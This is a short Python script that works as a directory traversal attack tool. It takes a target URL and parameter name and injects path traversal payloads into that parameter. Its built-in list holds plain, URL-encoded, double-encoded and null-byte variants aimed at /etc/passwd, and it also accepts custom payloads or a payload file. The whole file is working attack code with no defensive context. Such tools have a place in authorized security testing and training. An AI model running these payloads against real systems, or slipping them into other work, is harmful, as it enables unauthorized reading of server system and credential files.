import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

commonpayloads = [
    '../../../etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    '../../../etc/passwd%00',
    '..//..//..//etc//passwd'
]
url = input("Enter full target URL (with parameters, e.g. https://example.com/image?filename=28.jpg): ").strip()
param = input("Enter the vulnerable parameter name (e.g. filename): ").strip()



choice = input("""Choose a payload to test:
1. Common Payloads
2. My own payload
3. Use a payload file 
Enter choice number: """).strip()
parsed = urlparse(url)
params = parse_qs(parsed.query)

if param not in params:
    print(f"Parameter '{param}' not found in URL query.")
    exit()
if choice == "1":
    for payload in commonpayloads:
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query)) 

        print("Testing payload:", payload)
        r = requests.get(new_url)
        print("Status code:", r.status_code)
        print("Response preview:", r.text[:200])
elif choice == '2':
    mop = input("Enter Payload: ")
    payload = mop
    params[param] = [payload]

    new_query = urlencode(params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    print("Request URL:", new_url)
    print("Testing payload:", mop)
    r = requests.get(new_url)
    print("Status code:", r.status_code)
    print("Response preview:", r.text[:500])
elif choice == "3":
    file_path = input("Enter path to payload file: ").strip()
    try:
        with open(file_path, "r") as f:
            payloads = [line.strip() for line in f if line.strip()]
            print(payloads)
    except FileNotFoundError:
        print("File not found!")
        exit()
    for payload in payloads:
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))

        print("Testing payload:", payload)
        r = requests.get(new_url)
        print("Status code:", r.status_code)
        print("Response preview:", r.text[:200])
else:
    print("Invalid choice")
    exit()


